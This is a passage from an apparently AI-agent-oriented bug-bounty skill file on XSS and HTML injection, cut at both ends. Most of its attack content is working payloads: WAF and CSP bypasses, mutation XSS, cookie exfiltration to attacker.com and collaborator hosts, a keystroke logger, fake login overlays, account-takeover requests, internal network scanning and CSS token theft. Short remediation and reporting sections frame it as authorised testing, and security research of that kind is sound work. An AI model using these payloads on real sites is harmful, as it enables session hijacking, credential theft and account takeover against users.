- **C.** Handler executes in `target.com` context; response is `postMessage`'d back to attacker page via `event.source.postMessage(stolenData, '*')`.
- **Impact:** Cross-origin JS execution and exfil with no CSP violation.

### Chain 6 — Markdown/Wiki XSS + Privileged Viewer -> Cross-Privilege Stored XSS

- **A.** Stored XSS in a collaborative content field (wiki page, issue comment, customer ticket, support reply) — payload survives Markdown rendering due to insufficient allowlist.
- **B.** The collaborative content is viewed by a privileged user (admin, support agent with elevated permissions, project maintainer).
- **C.** Privileged viewer's session executes the payload in their authenticated context — XHR to admin-only endpoints, role-change of attacker, secret exfil from admin-only panels.
- **Impact:** Privilege escalation from low-priv user to admin via stored XSS.

### Operator-level pattern

When you confirm XSS at A, immediately ask: what state-changing endpoint or token store does this JS now have access to? *Where does the payload run, and who sees it?* The chain payout is 5-20x the standalone XSS payout. Discipline gate before submission: do not file XSS as "Critical" without demonstrating the terminal impact (ATO / token exfil / privilege escalation); file as Medium otherwise.

---

## Related Skills & Chains

- **`hunt-cache-poison`** — Reflected XSS becomes stored-equivalent at CDN scale when the vulnerable parameter is unkeyed. Chain primitive: `X-Forwarded-Host: attacker.com` poisons a cached response whose `<script src=...>` now points at attacker.com.
- **`hunt-csrf`** — XSS on origin auto-defeats SameSite=Lax and same-origin checks for state-changing endpoints. Chain primitive: stored XSS in profile bio -> fetch(`/settings/email`, {method:'POST', body:'email=attacker@evil'}) executes with victim's cookies and origin -> silent email takeover -> password reset -> full ATO.
- **`hunt-http-smuggling`** — Smuggling delivers an XSS payload into the response queue of the NEXT victim's request, even on endpoints that sanitize their own inputs.
- **`security-arsenal`** — Reach for the XSS payload bank (SVG+style, math+style mXSS, CSP-bypass JSONP gadgets, HTML5 event handlers WAFs miss) before hand-crafting payloads.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on stored XSS that only fires in the attacker's own session, or before claiming reflected XSS where the canary appears HTML-encoded in the response body.


---

## Rifteo Techniques — xss-hunter

# XSS Attack Methodology

XSS occurs when user-controlled input is rendered in a browser without proper sanitization or encoding, allowing arbitrary JavaScript execution in the victim's context.

**Before testing anything â€” understand the injection context:**
The payload you need depends entirely on *where* your input lands in the page source. Always view source or open DevTools after injecting a canary string (`xsstest123`) to locate where it appears.

```
HTML body:       <p>xsstest123</p>             â†’ <script> or <img onerror>
HTML attribute:  <input value="xsstest123">   â†’ " onmouseover= or ">
JS string:       var x = "xsstest123";        â†’ ";alert(1)//
JS template:     `Hello xsstest123`           â†’ ${alert(1)}
URL/href:        href="xsstest123"            â†’ javascript:alert(1)
CSS:             style="color:xsstest123"     â†’ expression(alert(1)) [IE]
```

---

## Attack Index

| # | Type | Description |
|---|------|-------------|
| 1 | Reflected XSS | Input reflected immediately in response |
| 2 | Stored XSS | Input persisted and rendered for other users |
| 3 | DOM-based XSS | Input processed by client-side JS into a dangerous sink |
| 4 | Blind XSS | Execution happens in a context you can't see (admin panel, logs) |
| 5 | Filter & WAF Evasion | Bypass blacklists, sanitizers, WAF rules |
| 6 | CSP Bypass | Exploit weak Content-Security-Policy headers |
| 7 | Mutation XSS (mXSS) | Browser mutation turns safe markup into executable XSS |
| 8 | DOM Clobbering | Overwrite JS variables using named HTML elements |
| 9 | Impact Escalation | Session hijack, credential theft, keylogging, CSRF |

---

## Phase 1 â€” Reconnaissance: Find All Input Surfaces

Cast a wide net before injecting anything.

### 1.1 URL Parameters
```
GET /search?q=test
GET /page?id=1&ref=home
GET /profile?user=alice
```

### 1.2 Form Fields
- Search bars, login forms, registration, comments, bio fields, file name inputs
- Hidden fields: `<input type="hidden" name="redirect" value="/home">`

### 1.3 HTTP Headers (often reflected in error pages)
```
Referer: https://attacker.com/<script>alert(1)</script>
User-Agent: <script>alert(1)</script>
X-Forwarded-For: <script>alert(1)</script>
X-Original-URL: /"><script>alert(1)</script>
```

### 1.4 JSON / API Responses rendered in UI
- API response fields that get injected into the DOM via `innerHTML`
- Username, display name, bio, address fields stored in API and rendered later

### 1.5 File Uploads
- Upload an SVG with embedded JS: `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`
- Upload HTML file if allowed
- Filename itself: `"><img src=x onerror=alert(1)>.png`

### 1.6 DOM Sources (for DOM XSS)
```javascript
// Sources â€” user-controlled entry points into JS
location.href / location.search / location.hash
document.referrer
document.URL
window.name
postMessage data
localStorage / sessionStorage (if populated from URL)
```

---

## Attack 1 â€” Reflected XSS

**What:** Input is reflected in the HTTP response immediately without being stored.

**Step 1 â€” Inject a canary to locate reflection:**
```
GET /search?q=xsstest123
```
View source â†’ find `xsstest123` â†’ note the surrounding context.

**Step 2 â€” Choose payload for context:**

```html
<!-- HTML body context -->
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<body onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>

<!-- HTML attribute context (value="HERE") -->
" onmouseover="alert(document.domain)
" autofocus onfocus="alert(document.domain)
"><img src=x onerror=alert(document.domain)>

<!-- JavaScript string context (var x = "HERE") -->
";alert(document.domain)//
'-alert(document.domain)-'
\';alert(document.domain)//

<!-- JavaScript template literal context (`Hello HERE`) -->
${alert(document.domain)}

<!-- href/src attribute context -->
javascript:alert(document.domain)
data:text/html,<script>alert(document.domain)</script>

<!-- Inside a script block as a value -->
</script><script>alert(document.domain)</script>
```

**Step 3 â€” Confirm:** observe alert box with `document.domain`. Always use `document.domain` (not `1`) to prove the execution origin.

---

## Attack 2 â€” Stored XSS

**What:** Input is saved server-side and rendered to other users â€” higher impact than reflected.

**High-value injection points:**
- Comment/review fields
- Profile fields (name, bio, address, job title)
- Chat / messaging features
- Support ticket subject/body
- Product/listing names and descriptions
- Notification text
- File/folder names in cloud storage UIs

**Testing approach:**
1. Inject a payload in the field and save
2. View the page as a *different user* (or in a fresh session)
3. If payload executes â€” confirm stored XSS

**Persistent payload (survives page reload):**
```html
<img src=x onerror="this.src='https://your-collaborator.net/?c='+document.cookie">
<script>document.location='https://your-collaborator.net/?c='+document.cookie</script>
<svg/onload="fetch('https://your-collaborator.net/?c='+btoa(document.cookie))">
```

**Check all consumers:** a stored payload in a profile field may execute on:
- `/profile/alice` (public)
- `/admin/users/alice` (admin panel) â† highest impact
- Email notifications (if HTML email)
- API response consumed by another frontend

---

## Attack 3 â€” DOM-Based XSS

**What:** The server response is safe, but client-side JavaScript reads from a source and writes to a dangerous sink without sanitization.

**Common dangerous sinks:**
```javascript
element.innerHTML = userInput;          // most common
element.outerHTML = userInput;
document.write(userInput);
document.writeln(userInput);
element.insertAdjacentHTML('...', userInput);
eval(userInput);
setTimeout(userInput, 0);
setInterval(userInput, 0);
new Function(userInput)();
location.href = userInput;              // XSS via javascript:
location.assign(userInput);
location.replace(userInput);
element.src = userInput;
element.setAttribute('href', userInput);
jQuery(userInput);                      // jQuery XSS
$.parseHTML(userInput);
```

**Testing approach:**
1. Find parameters that appear in client-side JS (hash, search, name)
2. Inject into URL hash/fragment (not sent to server, bypasses server WAF):
   ```
   https://target.com/page#<img src=x onerror=alert(document.domain)>
   https://target.com/page?returnUrl=javascript:alert(1)
   ```
3. Search JS files for dangerous sinks and trace data flow back to sources

**Hunt for DOM XSS in JS files:**
```bash
# Find innerHTML/eval usage in JS bundles
curl -s https://target.com/app.js | grep -E "innerHTML|outerHTML|document\.write|eval\(|setTimeout\(|location\.href"

# Use Burp DOM Invader (embedded browser extension)
# Use dalfox with --deep-domxss flag
dalfox url "https://target.com/search?q=test" --deep-domxss
```

---

## Attack 4 â€” Blind XSS

**What:** The XSS fires in a context you cannot directly observe â€” admin panel, internal dashboard, log viewer, support ticket system, PDF renderer, email client.

**Strategy:** use an out-of-band callback payload that phones home when it executes.

**Payload with full context capture:**
```javascript
// Self-contained OOB payload â€” captures URL, cookies, DOM, IP
<script>
var d=document;
fetch('https://your-collaborator.net/xss?'+new URLSearchParams({
  url: d.location.href,
  cookie: d.cookie,
  dom: d.documentElement.innerHTML.substring(0,500),
  ua: navigator.userAgent
}));
</script>
```

**Compact versions for length-limited fields:**
```html
<img src=x onerror="fetch('https://your-collaborator.net/?c='+document.cookie)">
<script src="https://your-collaborator.net/payload.js"></script>
```

**Tools for blind XSS:**
- **XSS Hunter** (xsshunter.trufflesecurity.com) â€” generates unique payloads per target, captures full page screenshot + DOM + cookies when fired
- **Burp Collaborator** â€” simple OOB DNS/HTTP callback
- **interactsh** â€” open-source OOB server: `interactsh-client` generates a unique URL

**Where to inject blind XSS:**
- Support ticket / bug report forms
- Feedback widgets
- User-agent or X-Forwarded-For headers (logged in dashboards)
- Order notes / shipping address (rendered in admin order view)
- Username (may appear in audit logs or admin user list)

---

## Attack 5 â€” Filter & WAF Evasion

When basic payloads are blocked, work through these techniques systematically.

### 5.1 Case Variation
```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
```

### 5.2 Tag Alternatives (when `<script>` is blocked)
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<object data="javascript:alert(1)">
<math><mtext><table><mglyph><svg><mtext><textarea>
  <path id="</textarea><img onerror=alert(1) src=1>">
```

### 5.3 Encoding Bypasses
```html
<!-- HTML entities -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

<!-- URL encoding (in href/src) -->
<a href="javascript:%61lert(1)">click</a>

<!-- Double URL encoding -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Unicode escapes (inside JS context) -->
\u0061lert(1)
\u{61}lert(1)

<!-- HTML5 numeric entities -->
&#x61;&#x6C;&#x65;&#x72;&#x74;(1)

<!-- Null bytes / special chars to break filters -->
<scr\x00ipt>alert(1)</scr\x00ipt>
<scr\nipt>alert(1)</scrip\nt>
```

### 5.4 JavaScript Obfuscation
```javascript
// Avoid "alert"
confirm(1)
prompt(1)
console.log(1)   // safer for detection proof
window['al'+'ert'](1)
(a=alert)(1)
top['al\x65rt'](1)
eval('ale'+'rt(1)')
Function('alert(1)')()
[].constructor.constructor('alert(1)')()

// Avoid parentheses (some WAFs)
alert`1`
throw onerror=alert,1337

// Avoid quotes
String.fromCharCode(88,83,83)
/XSS/.source
```

### 5.5 Polyglot Payloads (test multiple contexts at once)
```javascript
// Works in HTML, attribute, and JS string contexts
javascript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

// Gareth Heyes polyglot
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>

// Short universal polyglot
">'><svg/onload=alert(1)>
```

### 5.6 WAF-Specific Bypasses
```bash
# Cloudflare â€” use less common tags + encoding
<svg/onload=alert&#40;1&#41;>
<a/href="j%26Tab;avascript:alert(1)">click

# ModSecurity â€” split across parameters (HPP)
GET /search?q=<scri&q=pt>alert(1)</scri&q=pt>

# Filter that strips <script> once â€” double nesting
<scr<script>ipt>alert(1)</scr</script>ipt>

# Filters checking for "javascript:" â€” use tab/newline
<a href="java&#9;script:alert(1)">
<a href="java&#10;script:alert(1)">
```

---

## Attack 6 â€” CSP Bypass

Check CSP header first:
```bash
curl -s -I https://target.com | grep -i content-security-policy
```

### 6.1 Unsafe Directives â€” Instant Win
```
script-src 'unsafe-inline'   â†’ inline <script> works directly
script-src 'unsafe-eval'     â†’ eval(), setTimeout(string) work
script-src *                 â†’ load script from any domain
```

### 6.2 Whitelisted CDN Abuse (JSONP / Angular)
If `script-src` whitelists a CDN that hosts JSONP endpoints or AngularJS:
```html
<!-- JSONP callback on whitelisted domain -->
<script src="https://whitelisted-cdn.com/api?callback=alert(1)//"></script>

<!-- AngularJS CSP bypass (if angular.js is whitelisted) -->
<div ng-app ng-csr-nonce="">{{constructor.constructor('alert(1)')()}}</div>
```

### 6.3 `script-src-elem` vs `script-src` mismatch
Some browsers fall back differently â€” try `<script>` if `script-src-elem` is not set.

### 6.4 `base-uri` not set â†’ base tag injection
```html
<base href="https://attacker.com/">
<!-- All relative script/link imports now load from attacker.com -->
```

### 6.5 `default-src` without `script-src`
If only `default-src` is set, `object-src` and `script-src` may not be restricted:
```html
<object data="data:text/html,<script>alert(1)</script>"></object>
```

### 6.6 Nonce/hash leak
If `script-src 'nonce-abc123'` is used:
- Check if the nonce is static (doesn't change per request)
- Check if nonce is reflected elsewhere in the page
- Check if nonce is predictable

---

## Attack 7 â€” Mutation XSS (mXSS)

**What:** The browser's HTML parser mutates apparently safe markup into something executable when assigned via `innerHTML`.

**Classic mXSS payload:**
```html
<!-- Assigned to innerHTML â€” browser mutates closing tag -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- Table context mutation -->
<table><tbody><tr><td><img src="1" onerror=alert(1)//</td></tr></tbody></table>

<!-- SVG namespace confusion -->
<svg><style><img src=x onerror=alert(1)></style></svg>

<!-- math/foreignObject mutation -->
<math><mtext><table><mglyph><svg><mtext><textarea>
<path id="</textarea><img onerror=alert(1) src=1>">
```

**When to try mXSS:** when the app uses DOMPurify <= 2.0.x or any HTML sanitizer, and basic XSS is blocked. Browser mutation can sometimes reconstruct executable HTML from "safe" input.

---

## Attack 8 â€” DOM Clobbering

**What:** Named HTML elements (`id`, `name`) overwrite JS global variables or properties, causing unsafe behavior when the code later uses those variables.

**Basic clobbering:**
```html
<!-- If code does: if (window.isAdmin) â†’ inject: -->
<img id=isAdmin>
<input id=isAdmin value=true>

<!-- If code does: document.getElementById('config').src â†’ inject: -->
<a id=config href="javascript:alert(1)">

<!-- Clobber document.forms[0].action (form hijack) -->
<form id=target><input name=action value="https://attacker.com/steal"></form>
```

**Double clobbering (clobber a property of a property):**
```html
<!-- Code: config.token â†’ inject: -->
<form id=config><input id=config name=token value=CLOBBERED></form>
```

**When to use:** when JS references `window.X` or `document.X` that isn't explicitly declared, and those values are used in security decisions or URL construction.

---

## Attack 9 â€” Impact Escalation

After confirming XSS executes, demonstrate real-world impact.

### 9.1 Cookie Theft (Session Hijacking)
```javascript
// Exfiltrate cookies
fetch('https://attacker.com/steal?c=' + btoa(document.cookie))

// Via image (no CORS)
new Image().src = 'https://attacker.com/steal?c=' + encodeURIComponent(document.cookie)

// Via XSS Hunter payload (captures everything)
```

### 9.2 Credential Harvesting (Phishing via XSS)
```javascript
// Inject fake login overlay on the page
document.body.innerHTML = `
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:99999">
  <form action="https://attacker.com/harvest" method="post">
    <h2>Session expired â€” please log in again</h2>
    <input name="user" placeholder="Username"><br>
    <input name="pass" type="password" placeholder="Password"><br>
    <button>Login</button>
  </form>
</div>`;
```

### 9.3 Keylogging
```javascript
document.addEventListener('keydown', e => {
  fetch('https://attacker.com/keys?k=' + encodeURIComponent(e.key));
});
```

### 9.4 CSRF via XSS (bypass SameSite / CSRF tokens)
```javascript
// XSS can read the CSRF token from the page, then use it
const token = document.querySelector('[name=csrf_token]').value;
fetch('/api/admin/delete-user', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json', 'X-CSRF-Token': token},
  body: JSON.stringify({user_id: 1})
});
```

### 9.5 Account Takeover via XSS
```javascript
// Change victim's email/password using their authenticated session
fetch('/api/account', {
  method: 'PATCH',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com', password: 'hacked123'})
});
```

### 9.6 Internal Network Scanning (pivot via XSS)
```javascript
// Scan internal IPs from victim's browser
['192.168.1.1','192.168.1.254','10.0.0.1'].forEach(ip => {
  fetch(`http://${ip}/`, {mode: 'no-cors'})
    .then(() => fetch('https://attacker.com/?alive=' + ip));
});
```

---

## Quick Recon Checklist

Before injecting payloads, run this:

```bash
# 1. Find all parameters with Wayback/gau
gau target.com | grep "=" | sort -u

# 2. Check CSP header
curl -s -I https://target.com | grep -i "content-security-policy"

# 3. Automated parameter discovery
paramspider -d target.com

# 4. Fast XSS scan (dalfox)
dalfox url "https://target.com/search?q=test"

# 5. Check response headers for X-XSS-Protection (legacy)
curl -s -I https://target.com | grep -i "x-xss"

# 6. JS file audit â€” find dangerous sinks
cat app.js | grep -E "innerHTML|document\.write|eval\(|location\.href\s*="
```

---

## Report Structure

```
Title: [Stored/Reflected/DOM] XSS on [endpoint/feature]

Severity: [Critical (stored+admin), High (stored), Medium (reflected), Low (self-XSS)]

Affected endpoint: [METHOD] [URL] â€” parameter: [name]

Steps to reproduce:
1. [Setup: log in as X, navigate to Y]
2. Inject the following payload into [field]: [PAYLOAD]
3. [Trigger: submit form / visit URL / wait for admin to view]
4. Observe: JavaScript executes â€” alert shows [document.domain]

Impact:
- [Describe: cookie theft / session hijack / account takeover / CSRF]
- [Affected users: all visitors / admin users / specific role]

Evidence:
- Screenshot of alert box showing document.domain
- HTTP request/response showing reflection or storage
- For stored: show two different sessions â€” inject + trigger

Remediation:
- Encode all user output for its context (HTML encode for HTML, JS encode for JS)
- Use textContent instead of innerHTML where possible
- Implement a strict Content-Security-Policy
- Use a security-tested sanitizer (DOMPurify) for HTML rendering
- Set HttpOnly on session cookies to limit theft impact
```

---

## Scripts

### `scripts/xss_agent.py`
Requires: `pip3 install requests`

```bash
# Reflected XSS â€” Bearer token auth
python3 scripts/xss_agent.py https://target.com \
  --token "eyJ..." \
  --params "/search?q=FUZZ" "/profile?name=FUZZ"

# Reflected XSS â€” Cookie auth
python3 scripts/xss_agent.py https://target.com \
  --cookie "session=abc" \
  --params "/search?q=FUZZ"

# Stored XSS test
python3 scripts/xss_agent.py https://target.com \
  --token "eyJ..." \
  --submit-endpoint /api/comments \
  --display-endpoint /comments \
  --field body \
  -o report.json
```

The script automatically: checks CSP headers â†’ injects a canary to find reflection â†’ detects context (HTML body / attribute / JS string) â†’ selects matching payloads â†’ confirms execution â†’ outputs a JSON report.

---

## Reference Files

- `references/payloads.md` â€” payload list by context
- `references/tools.md` â€” dalfox, XSStrike, Burp usage



---

## From hack-skills: XSS — Extended Scenarios & CVE Cases

### CVE-2017-12794: Django Debug Page XSS

Conditions: `DEBUG=True` in production (common misconfiguration).

```
1. Register username: <script>alert(1)</script>
2. Try to register AGAIN with same username
3. Django raises IntegrityError with duplicate key value
4. Debug page renders error including unescaped username → XSS
```

### UTF-7 XSS (Legacy IE)

When page doesn't specify charset and IE auto-detects encoding:
```
+/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4-
```
`+ADw-` = `<` in UTF-7. Only works if `Content-Type: text/html; charset=utf-8` is NOT set.

### HttpOnly Bypass Strategies

HttpOnly prevents `document.cookie` access — but XSS can still:

| Technique | How |
|---|---|
| Proxy the browser | XSS sends authenticated XHR requests (no cookie needed) |
| CSRF via XSS | Read CSRF token from DOM → perform state-changing action |
| Keylogger | Capture credentials as victim types |
| Session riding | Browse app via injected JS, extract response data |

### XSS Polyglot Payloads

```javascript
// 0xsobky universal:
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

// s0md3v:
-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>

// Polyglot for multiple contexts:
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>
```

### WAF Bypass by Vendor

**Cloudflare:**
```html
<svg onload=prompt``>
<img src=x onnull=alert(1)>
<a href="java
script:alert(1)">click</a>
```

**Akamai:**
```html
</script><base href="javascript:/a]/-alert(1)//">
<dETAILS open oNtoggle=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

**Incapsula (Imperva):**
```html
<script>$.globalEval("al"+"ert(1)")</script>
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

**WordFence:**
```html
<a href="javas&#99;ript:alert(1)">click</a>
<img src=x onerror="&#x61;lert(1)">
```

### CSS Injection Data Exfiltration

When CSS injection is possible but not JavaScript (CSP allows `unsafe-inline` for styles):

```css
/* Extract CSRF token character by character via attribute selector: */
input[name="csrf"][value^="a"] { background: url(https://attacker.com/?token=a); }
input[name="csrf"][value^="b"] { background: url(https://attacker.com/?token=b); }
/* Each request to attacker.com reveals matching prefix */

/* @font-face unicode-range side channel (detect chars in text nodes): */
@font-face { font-family: probe; src: url(https://attacker.com/?char=A); unicode-range: U+0041; }
.secret-text { font-family: probe; }
/* Browser only loads the font for chars that actually appear in element */
```


---

## [HTML Injection Testing (zebbern)] Additional Techniques

# HTML Injection Testing

## Purpose

Identify and exploit HTML injection vulnerabilities that allow attackers to inject malicious HTML content into web applications. This vulnerability enables attackers to modify page appearance, create phishing pages, and steal user credentials through injected forms.

## Prerequisites

### Required Tools
- Web browser with developer tools
- Burp Suite or OWASP ZAP
- Tamper Data or similar proxy
- cURL for testing payloads

### Required Knowledge
- HTML fundamentals
- HTTP request/response structure
- Web application input handling
- Difference between HTML injection and XSS

## Outputs and Deliverables

1. **Vulnerability Report** - Identified injection points
2. **Exploitation Proof** - Demonstrated content manipulation
3. **Impact Assessment** - Potential phishing and defacement risks
4. **Remediation Guidance** - Input validation recommendations

## Core Workflow

### Phase 1: Understanding HTML Injection

HTML injection occurs when user input is reflected in web pages without proper sanitization:

```html
<!-- Vulnerable code example -->
<div>
    Welcome, <?php echo $_GET['name']; ?>
</div>

<!-- Attack input -->
?name=<h1>Injected Content</h1>

<!-- Rendered output -->
<div>
    Welcome, <h1>Injected Content</h1>
</div>
```

Key differences from XSS:
- HTML injection: Only HTML tags are rendered
- XSS: JavaScript code is executed
- HTML injection is often stepping stone to XSS

Attack goals:
- Modify website appearance (defacement)
- Create fake login forms (phishing)
- Inject malicious links
- Display misleading content

### Phase 2: Identifying Injection Points

Map application for potential injection surfaces:

```
1. Search bars and search results
2. Comment sections
3. User profile fields
4. Contact forms and feedback
5. Registration forms
6. URL parameters reflected on page
7. Error messages
8. Page titles and headers
9. Hidden form fields
10. Cookie values reflected on page
```

Common vulnerable parameters:
```
?name=
?user=
?search=
?query=
?message=
?title=
?content=
?redirect=
?url=
?page=
```

### Phase 3: Basic HTML Injection Testing

Test with simple HTML tags:

```html
<!-- Basic text formatting -->
<h1>Test Injection</h1>
<b>Bold Text</b>
<i>Italic Text</i>
<u>Underlined Text</u>
<font color="red">Red Text</font>

<!-- Structural elements -->
<div style="background:red;color:white;padding:10px">Injected DIV</div>
<p>Injected paragraph</p>
<br><br><br>Line breaks

<!-- Links -->
<a href="http://attacker.com">Click Here</a>
<a href="http://attacker.com">Legitimate Link</a>

<!-- Images -->
<img src="http://attacker.com/image.png">
<img src="x" onerror="alert(1)">  <!-- XSS attempt -->
```

Testing workflow:
```bash
# Test basic injection
curl "http://target.com/search?q=<h1>Test</h1>"

# Check if HTML renders in response
curl -s "http://target.com/search?q=<b>Bold</b>" | grep -i "bold"

# Test in URL-encoded form
curl "http://target.com/search?q=%3Ch1%3ETest%3C%2Fh1%3E"
```

### Phase 4: Types of HTML Injection

#### Stored HTML Injection

Payload persists in database:

```html
<!-- Profile bio injection -->
Name: John Doe
Bio: <div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;">
     <h1>Site Under Maintenance</h1>
     <p>Please login at <a href="http://attacker.com/login">portal.company.com</a></p>
     </div>

<!-- Comment injection -->
Great article!
<form action="http://attacker.com/steal" method="POST">
    <input name="username" placeholder="Session expired. Enter username:">
    <input name="password" type="password" placeholder="Password:">
    <input type="submit" value="Login">
</form>
```

#### Reflected GET Injection

Payload in URL parameters:

```html
<!-- URL injection -->
http://target.com/welcome?name=<h1>Welcome%20Admin</h1><form%20action="http://attacker.com/steal">

<!-- Search result injection -->
http://target.com/search?q=<marquee>Your%20account%20has%20been%20compromised</marquee>
```

#### Reflected POST Injection

Payload in POST data:

```bash
# POST injection test
curl -X POST -d "comment=<div style='color:red'>Malicious Content</div>" \
     http://target.com/submit

# Form field injection
curl -X POST -d "name=<script>alert(1)</script>&email=test@test.com" \
     http://target.com/register
```

#### URL-Based Injection

Inject into displayed URLs:

```html
<!-- If URL is displayed on page -->
http://target.com/page/<h1>Injected</h1>

<!-- Path-based injection -->
http://target.com/users/<img src=x>/profile
```

### Phase 5: Phishing Attack Construction

Create convincing phishing forms:

```html
<!-- Fake login form overlay -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;
            background:white;z-index:9999;padding:50px;">
    <h2>Session Expired</h2>
    <p>Your session has expired. Please log in again.</p>
    <form action="http://attacker.com/capture" method="POST">
        <label>Username:</label><br>
        <input type="text" name="username" style="width:200px;"><br><br>
        <label>Password:</label><br>
        <input type="password" name="password" style="width:200px;"><br><br>
        <input type="submit" value="Login">
    </form>
</div>

<!-- Hidden credential stealer -->
<style>
    input { background: url('http://attacker.com/log?data=') }
</style>
<form action="http://attacker.com/steal" method="POST">
    <input name="user" placeholder="Verify your username">
    <input name="pass" type="password" placeholder="Verify your password">
    <button>Verify</button>
</form>
```

URL-encoded phishing link:
```
http://target.com/page?msg=%3Cdiv%20style%3D%22position%3Afixed%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%3Bbackground%3Awhite%3Bz-index%3A9999%3Bpadding%3A50px%3B%22%3E%3Ch2%3ESession%20Expired%3C%2Fh2%3E%3Cform%20action%3D%22http%3A%2F%2Fattacker.com%2Fcapture%22%3E%3Cinput%20name%3D%22user%22%20placeholder%3D%22Username%22%3E%3Cinput%20name%3D%22pass%22%20type%3D%22password%22%3E%3Cbutton%3ELogin%3C%2Fbutton%3E%3C%2Fform%3E%3C%2Fdiv%3E
```

### Phase 6: Defacement Payloads

Website appearance manipulation:

```html
<!-- Full page overlay -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;
            background:#000;color:#0f0;z-index:9999;
            display:flex;justify-content:center;align-items:center;">
    <h1>HACKED BY SECURITY TESTER</h1>
</div>

<!-- Content replacement -->
<style>body{display:none}</style>
<body style="display:block !important">
    <h1>This site has been compromised</h1>
</body>

<!-- Image injection -->
<img src="http://attacker.com/defaced.jpg" 
     style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">

<!-- Marquee injection (visible movement) -->
<marquee behavior="alternate" style="font-size:50px;color:red;">
    SECURITY VULNERABILITY DETECTED
</marquee>
```

### Phase 7: Advanced Injection Techniques

#### CSS Injection

```html
<!-- Style injection -->
<style>
    body { background: url('http://attacker.com/track?cookie='+document.cookie) }
    .content { display: none }
    .fake-content { display: block }
</style>

<!-- Inline style injection -->
<div style="background:url('http://attacker.com/log')">Content</div>
```

#### Meta Tag Injection

```html
<!-- Redirect via meta refresh -->
<meta http-equiv="refresh" content="0;url=http://attacker.com/phish">

<!-- CSP bypass attempt -->
<meta http-equiv="Content-Security-Policy" content="default-src *">
```

#### Form Action Override

```html
<!-- Hijack existing form -->
<form action="http://attacker.com/steal">

<!-- If form already exists, add input -->
<input type="hidden" name="extra" value="data">
</form>
```

#### iframe Injection

```html
<!-- Embed external content -->
<iframe src="http://attacker.com/malicious" width="100%" height="500"></iframe>

<!-- Invisible tracking iframe -->
<iframe src="http://attacker.com/track" style="display:none"></iframe>
```

### Phase 8: Bypass Techniques

Evade basic filters:

```html
<!-- Case variations -->
<H1>Test</H1>
<ScRiPt>alert(1)</ScRiPt>

<!-- Encoding variations -->
&#60;h1&#62;Encoded&#60;/h1&#62;
%3Ch1%3EURL%20Encoded%3C%2Fh1%3E

<!-- Tag splitting -->
<h
1>Split Tag</h1>

<!-- Null bytes -->
<h1%00>Null Byte</h1>

<!-- Double encoding -->
%253Ch1%253EDouble%2520Encoded%253C%252Fh1%253E

<!-- Unicode encoding -->
\u003ch1\u003eUnicode\u003c/h1\u003e

<!-- Attribute-based -->
<div onmouseover="alert(1)">Hover me</div>
<img src=x onerror=alert(1)>
```

### Phase 9: Automated Testing

#### Using Burp Suite

```
1. Capture request with potential injection point
2. Send to Intruder
3. Mark parameter value as payload position
4. Load HTML injection wordlist
5. Start attack
6. Filter responses for rendered HTML
7. Manually verify successful injections
```

#### Using OWASP ZAP

```
1. Spider the target application
2. Active Scan with HTML injection rules
3. Review Alerts for injection findings
4. Validate findings manually
```

#### Custom Fuzzing Script

```python
#!/usr/bin/env python3
import requests
import urllib.parse

target = "http://target.com/search"
param = "q"

payloads = [
    "<h1>Test</h1>",
    "<b>Bold</b>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<a href='http://evil.com'>Click</a>",
    "<div style='color:red'>Styled</div>",
    "<marquee>Moving</marquee>",
    "<iframe src='http://evil.com'></iframe>",
]

for payload in payloads:
    encoded = urllib.parse.quote(payload)
    url = f"{target}?{param}={encoded}"
    
    try:
        response = requests.get(url, timeout=5)
        if payload.lower() in response.text.lower():
            print(f"[+] Possible injection: {payload}")
        elif "<h1>" in response.text or "<b>" in response.text:
            print(f"[?] Partial reflection: {payload}")
    except Exception as e:
        print(f"[-] Error: {e}")
```

### Phase 10: Prevention and Remediation

Secure coding practices:

```php
// PHP: Escape output
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// PHP: Strip tags
echo strip_tags($user_input);

// PHP: Allow specific tags only
echo strip_tags($user_input, '<p><b><i>');
```

```python
# Python: HTML escape
from html import escape
safe_output = escape(user_input)

# Python Flask: Auto-escaping
